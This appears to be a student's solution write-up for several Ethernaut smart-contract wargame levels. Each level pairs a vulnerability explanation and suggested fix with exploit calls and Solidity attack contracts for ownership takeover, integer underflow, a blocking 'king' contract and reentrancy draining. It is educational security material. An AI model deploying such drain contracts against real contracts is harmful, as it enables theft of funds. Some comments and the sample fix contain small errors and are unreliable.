
/* ===================================== Level 1: Fallback ===================================== */

/**
  1. Describe the vulnerability in 1-3 sentences
  The fallback function `receive()` is problematic as it will just change the owner
  to the current message sender, provided that the current message sender has contributed
  to the contract before and carries some value this time. Thus, a hacker could simply 
  send very little amount to this contract first, and then send another transaction without
  specifying a function in calldata to invoke `receive()`. After the hacker becomes the owner,
  they can steal all the balance.
 */

/**
  2. A series of exploiting calls are shown as below:
 */
sendTransaction({
  from: player,
  to: contract.address,
  value: toWei('0.0000001','ether'),
  data: web3.eth.abi.encodeFunctionSignature('contribute()')
})

sendTransaction({
  from: player,
  to: contract.address,
  value: toWei('0.0000001','ether') 
  // Do not provide function as calldata in order to invoke `receive()`
})

// Let's check if we succeeded in claiming ownership 
await contract.owner() == player // True

// Finally, let's withdraw all the fund!
await contract.withdraw()

// Let's check if we succeeded in stealing the balance
await getBalance(contract.address) == 0 // Should be true

/**
  3. Is there another series of calls/a different exploit contract that would have also led to an exploit?
  Claim ownership by contributing more than the current owner.
*/

/**
  4. What could the programmer have done differently to avoid this vulnerability?
  Re-write the fallback function `receive()` so that NO ownership transfer could happen in it.
  We should not implement business logic in fallback function anyway, so just modifying it to
  simply receive money should be okay.
 */


/* ===================================== Level 2: Fallout ===================================== */

/**
  1. Describe the vulnerability in 1-3 sentences
  There is a typo in the name of constructor: instead of Fallout(), it is actually Fal1out().
  So now Fal1out() is actually just a normal function that can be called by anyone at any time,
  and we can simply call it to claim ownership.
 */

/**
  2. A series of exploiting calls are shown as below:
 */

 // First, claim ownership via Fal1out()
await contract.Fal1out()

// Check we successfully claimed the ownership
await contract.owner() == player // Should be true now

/**
  3. Is there another series of calls/a different exploit contract that would have also led to an exploit?
  Not really, since there is no transfer of ownership happening anywhere else in this code,
  apart from in the "constructor" where the ownership is assigned for the first time. So I
  believe exploting Fal1out() is the only way to hack the ownership.

  However, there is an exploit in `sendAllocation` where the allocator's amount is not
  decremented after the transfer; so if I allocated, say, 1 ETH, at the beginning,
  I could call `sendAllocation` as many times as I want and get much more than 1 ETH.
*/

contract.allocate({ value: toWei('0.0000001','ether') })
contract.sendAllocation(player);
contract.sendAllocation(player);
...
contract.sendAllocation(player);

/**
  4. What could the programmer have done differently to avoid this vulnerability?
  Always choose to declare constructors using the `constructor` keyword 
  Remember to reset each contributor's amount to 0 before initiating the transfer.
 */

/* ===================================== Level 4: Telephone ===================================== */

/**
  1. Describe the vulnerability in 1-3 sentences
  If a hacker calls `changeOwner` using another contract, the tx.origin won't be equal to msg.sender,
  since the former will still be the account address whereas the latter the address of the contract
  invoking `Telephone.changeOwner`. In this case, hacker could easily claim ownership.
 */

/**
  2.The attack contract is shown as below:

  We have to use a contract to finish this hacking, since this is the only
  way to have tx.origin != msg.sender. In this case, tx.origin is player's
  account address, whereaas msg.sender will be the address of the hacking contract
 */

pragma solidity ^0.6.0;

interface TelephoneInterface {
  function changeOwner(address _owner) external;
}

contract TelephoneAttack {
  function attack(address victimContract) public {
    TelephoneInterface(victimContract).changeOwner(msg.sender);
  }
}

// We will just pass the address of the level instance as `victimContract` in REMIX IDE

// Let's check:
await contract.owner() == player // True

/**
  3. Is there another series of calls/a different exploit contract that would have also led to an exploit?
  As long as there are multiple layers in between of the victim contract and the original transaction 
  caller, we can claim the ownership.
*/

/**
  4. What could the programmer have done differently to avoid this vulnerability?
  Programmers should have a very good understanding of tx.origin and msg.sender
 */

 /* ===================================== Level 5: Token ===================================== */

 /**
  1. Describe the vulnerability in 1-3 sentences
  It is not safe to use `uint` type because both overflow and underflow could occur. 
  In this case, it is the underflow that causes a big problem. 

  Suppose `balances[msg.sender]` is 0, and `_value` is a positive number, say 1, 
  then `balances[msg.sender] - _value` will result in a very large value instead of -1,
  so it will pass the `require()` check and send money to the address of `_to`.
  If the hacker invokes the transfer with a contract, it is that contract whose amount
  will be deducted in the `mapping`, and the actual address of hacker (`_to`) will only
  receive fund without any price.
 */

/**
  2.The attack contract is shown as below:
 */

 // SPDX-License-Identifier: MIT 
pragma solidity ^0.8.7;

interface TokenInterface {
    function transfer(address _to, uint _value) external;
}

contract TokenAttack {
    function attack(address victimContract) public {
        TokenInterface(victimContract).transfer(msg.sender, 200);
    }
}

await contract.balanceOf(player) // Should return 220

/**
  3. Is there another series of calls/a different exploit contract that would have also led to an exploit?

*/

/**
  4. What could the programmer have done differently to avoid this vulnerability?
  Programmers can choose to either 
  1) use OpenZeppelin's SafeMath library, or
  2) do a manual check like the following, (assuming y > 0) making sure that
      x + y > x (no overflow occurs), and 
      x - y < x (no underflow occurs)
  before moving on to the next part of code.
 */

  /* ===================================== Level 9: King ===================================== */

 /**
  1. Describe the vulnerability in 1-3 sentences
  For the original owner to reclaim the king, fund transfer to the old king
  has to go through successfully before the ownership transfer could happen.

  We can exploit this logic in code by claiming the king first, then making 
  the transfer to the old king (us) fail every time. In this way, the entire
  transaction will always revert, preventing others from claiming the new king.

 */

/**
  2.The attack contract is shown as below:
 */

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

contract KingHack {

  // We will send 0.01 ether to the victim contract `_to` to claim the king
  function claimKing(address _to) public payable {
    (bool sent, bytes memory data) = _to.call{value: 10000000000000000}(""); 
    require(sent, "Fail to claim the king");
  }

  receive() external payable {
    revert("Rejecting transfer"); // transfer will fail
  }
}

/**
  3. Is there another series of calls/a different exploit contract that would have also led to an exploit?

*/

/**
  4. What could the programmer have done differently to avoid this vulnerability?
  Programmers could break the logic of refunding the old king and recognizing the new 
  king into separate pieces. For example, we can keep a mapping of every old king to 
  the amount of refund they should receive; and let the old king players claim refund
  by themselves, probably via a public method provided. In this way, we make the code
  more modular, and failure of one aspect won't block the whole business logic.
  
  See the example code below:
 */

 contract King {

  // Instance variables king, prize, owner same as before

  using SafeMath for uint256;
  mapping(address => uint) public refunds; // Track refund to each old king

  // Constructor same as before

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    refunds[king] = refunds[king].add(prize); // Update refund value to the old king

    king = msg.sender; // Recognize the new king
    prize = msg.value;
  }

  function claimRefund() public {
    uint refund = refunds[msg.sender];
    require(refund > 0);
    
    refunds[msg.sender] = 0;

    // Even if the transfer fails, it won't affect change of king
    msg.sender.transfer(refund);
  }

 }

   /* ===================================== Level 10: Reentry ===================================== */

    /**
  1. Describe the vulnerability in 1-3 sentences
  The original code made a mistake by not updating `balances[msg.sender]` first before making the 
  actual transfer, exposing itself to an exploit of re-entry where a hacking contract could call
  `withdraw()` in its fallback function and will be able to pass the pre-condition check (due to
  it not being updated in time) again.
 */

/**
  2.The attack contract is shown as below:
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IReentrance {
    function donate(address _to) payable external;
    function withdraw(uint _amount) external;
}

contract ReentranceHack {

    IReentrance private ire;
    uint private victimBalance = 0.001 ether; // 1000000000000000 wei

    // The idea is that if we donate the same amount as the current balance,
    // we can steal the entire fund by withdrawing twice, 1 from calling
    // `attack()` directly and the other from a re-entry via fallback()
    bool private entered = false;

    constructor(address _victimContract) {
        ire = IReentrance(_victimContract);
    }

    function makeFirstDonation() public payable {
        require(msg.value == victimBalance, "Must match the victim contract's balance at 0.001 ETF");
        ire.donate{value: victimBalance}(address(this));
    }

    function attack() public {
        ire.withdraw(victimBalance);
    }

    receive() external payable {
        if (!entered) {
            entered = true;
            attack();
        }
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}

// Order of call after deployment: 
// 1) makeFirstDonation() with 1 wei sent
// 2) attack()

 /**
  3. Is there another series of calls/a different exploit contract that would have also led to an exploit?
  Yes, in the above code we donated the same amount as the current balance so that only one re-entry is
  necessary to steal all the fund. However, in reality sometimes the current balance can be a lot and we
  may not have enough tokens to match that, in which case we can just donate a random small amount and 
  modify the fallback function to be something like the following:

  receive() external payable {
    if (address(ire).balance > 0) {
      attack();
    }
  }
  so as to keep re-entering until all the funds are stolen.

  Also, although SafeMath method is used in the `donate()` function, it is not used inside `withdraw()`,
  i.e., balances[msg.sender] -= _amount, rather than balances[msg.sender].sub(_amount), and this could
  lead to another problem of underflow. So in this case, if we donate 1 Wei, then do a normal withdraw
  and a re-entry via fallback, balances[msg.sender] will become negative, which for uint would be a huge
  value and the pre-condition check (balances[msg.sender] >= _amount) is likely to pass even for a big
  `_amount`. So we can simply call `withdraw(address(ire).balance)`, and steal the entire fund by only
  one additional re-entry, saving us a lot of gas. See the code below for an illustration:

*/

contract ReentranceHack {

    IReentrance private ire;
    uint private donationAmount = 1 wei;
    bool private entered = false;

    constructor(address _victimContract) {
        ire = IReentrance(_victimContract);
    }

    function makeFirstDonation() public payable {
        require(msg.value == donationAmount, "Must donate something at the beginning");
        ire.donate{value: donationAmount}(address(this));
    }

    function attack() public {
        ire.withdraw(donationAmount);
    }

    function stealAllFunds() public {
      ire.withdraw(address(ire).balance);
    }

    receive() external payable {
        if (!entered) {
            entered = true;
            attack();
        }
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}

// Order of call after deployment: 
// 1) makeFirstDonation() with 1 wei sent
// 2) attack()
// 3) stealAllFunds()

/**
  4. What could the programmer have done differently to avoid this vulnerability?

  Always remember to update the state variables inside a contract first, before calling
  any functions that involve interacting with other contracts. Also, use SafeMath methods 
  on arithmetic operations when possible to avoid underflow/overflow, For example, 

  if(balances[msg.sender] >= _amount) {
    balances[msg.sender].sub(_amount);
    (bool result,) = msg.sender.call{value:_amount}("");
    .....
  }
 */